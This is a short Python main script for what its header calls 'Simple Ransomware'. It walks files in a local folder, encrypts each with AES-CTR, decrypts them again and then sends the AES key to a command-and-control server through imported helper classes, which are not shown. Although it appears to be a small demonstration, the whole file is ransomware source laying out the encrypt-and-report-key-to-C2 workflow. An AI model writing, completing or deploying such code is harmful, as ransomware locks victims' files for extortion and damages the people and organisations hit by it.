# Simple Ransomware - Shinji Mimura

# Import Classes
from crypto.main import CryptClass
from server.main import C2Server
from utils.filefinder import FileFinder
from utils.RSAGenerator import RSAGen

# Import packages
import time
import pyaes

if __name__ == "__main__":

    # Classes
    cryptclass = CryptClass()
    c2server = C2Server()
    filefinder = FileFinder()

    aes = pyaes.AESModeOfOperationCTR(cryptclass.key)

    time.sleep(2)

    filefinder.filepaths("./files")


    for f in filefinder.file_paths:
        cryptclass.encrypt(f,aes)

    time.sleep(5)

    aes = pyaes.AESModeOfOperationCTR(cryptclass.key)

    for f in filefinder.file_paths:
        cryptclass.decrypt(f,aes)

    time.sleep(5)
    
    # Encrypt AES Key with Public RSA Key and send to C2 Server
    c2server.send_machine(cryptclass.key)